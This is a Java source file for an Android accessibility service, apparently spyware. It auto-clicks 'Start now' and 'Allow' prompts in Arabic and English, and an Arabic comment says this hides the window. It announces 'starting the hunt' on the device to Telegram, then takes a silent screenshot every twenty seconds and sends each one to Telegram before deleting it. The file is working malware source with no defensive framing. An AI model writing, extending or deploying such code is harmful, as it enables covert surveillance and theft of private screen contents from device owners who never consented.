package com.tom5.monitor;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileOutputStream;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class AutoClicker extends AccessibilityService {
    private Handler handler = new Handler(Looper.getMainLooper());
    private Executor executor = Executors.newSingleThreadExecutor();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // كود ضغط "البدء الآن" تلقائياً لإخفاء النافذة في الإصدارات القديمة
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        String[] targets = {"البدء الآن", "Start now", "بدء الآن", "START NOW", "السماح", "Allow"};
        for (String t : targets) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
            for (AccessibilityNodeInfo n : nodes) {
                n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                n.recycle();
            }
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        TelegramSender.sendMessage("✅ الخدمة اشتغلت! جاري بدء الصيد على: " + Build.MODEL);
        
        // حلقة التصوير التلقائي
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    takeSilentScreenshot(); // للأجهزة الحديثة
                }
                handler.postDelayed(this, 20000); 
            }
        }, 5000);
    }

    private void takeSilentScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(0, executor, new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult result) {
                    Bitmap b = Bitmap.wrapHardwareBuffer(result.getHardwareBuffer(), result.getColorSpace());
                    if (b != null) saveAndSend(b);
                }
                @Override public void onFailure(int i) {}
            });
        }
    }

    private void saveAndSend(Bitmap b) {
        new Thread(() -> {
            try {
                File f = new File(getCacheDir(), "s.jpg");
                try (FileOutputStream out = new FileOutputStream(f)) {
                    b.compress(Bitmap.CompressFormat.JPEG, 40, out);
                    TelegramSender.sendPhoto(f);
                    f.delete();
                }
                b.recycle();
            } catch (Exception ignored) {}
        }).start();
    }

    @Override public void onInterrupt() {}
}
